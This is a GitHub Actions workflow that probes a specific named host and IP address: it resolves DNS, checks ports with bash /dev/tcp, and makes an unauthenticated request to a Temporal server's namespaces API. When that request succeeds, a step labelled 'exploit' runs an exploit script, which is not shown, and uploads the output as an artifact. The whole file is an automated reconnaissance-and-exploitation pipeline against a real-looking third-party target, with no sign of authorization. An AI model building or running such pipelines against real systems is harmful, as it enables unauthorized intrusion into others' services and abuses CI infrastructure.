name: ul4035-temporal-probe
on:
  workflow_dispatch:
jobs:
  temporal:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - name: probe
        id: probe
        run: |
          mkdir -p out
          getent hosts temporalio.dev.ayshei.io | tee out/dns.txt || true
          for p in 443 7233 80; do
            if timeout 8 bash -c "echo > /dev/tcp/20.74.128.25/$p" 2>out/tcp_$p.err; then echo "$p OPEN" | tee -a out/dns.txt; else echo "$p CLOSED $(cat out/tcp_$p.err)" | tee -a out/dns.txt; fi
          done
          code=$(curl -skS --max-time 20 -o out/base_namespaces.body -w '%{http_code}' https://temporalio.dev.ayshei.io/api/v1/namespaces || true)
          echo "probe=$code"
          echo "code=$code" >> $GITHUB_OUTPUT
          head -c 400 out/base_namespaces.body | tee out/base_namespaces.head
      - name: exploit
        if: steps.probe.outputs.code == '200'
        run: |
          OUT=out python3 scripts/ul4035_exploit.py | tee out/run.log
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: ul4035-temporal-out
          path: out/
          retention-days: 14
